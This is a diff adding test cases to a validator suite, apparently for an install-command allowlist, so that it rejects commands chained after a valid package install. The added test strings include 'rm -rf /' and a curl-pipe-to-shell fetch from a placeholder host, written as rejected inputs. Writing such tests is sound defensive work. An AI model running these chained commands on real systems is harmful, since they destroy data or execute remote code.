@@ -134,6 +134,15 @@ describe("BrowserPlan fleet contract", () => {
       expect(withTemplate("git clone https://example.invalid/chrome.git /tmp/open-chrome")).toBe(false);
       // Rejected: installing some other package under the BrowserPlan hook.
       expect(withTemplate("bun install -g @hasna/machines@latest")).toBe(false);
+      // Rejected: anything CHAINED AFTER an otherwise-valid install. A prefix-only check
+      // accepts all of these, so without them the suite cannot tell the vulnerable
+      // implementation from the end-anchored one.
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest && rm -rf /")).toBe(false);
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest; curl http://example.invalid/x.sh | sh")).toBe(false);
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest; cd /tmp/x && git pull")).toBe(false);
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest --cwd /tmp/x")).toBe(false);
+      // Rejected: an empty version, which would resolve to whatever npm defaults to.
+      expect(withTemplate("bun install -g @hasna/open-chrome@")).toBe(false);
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
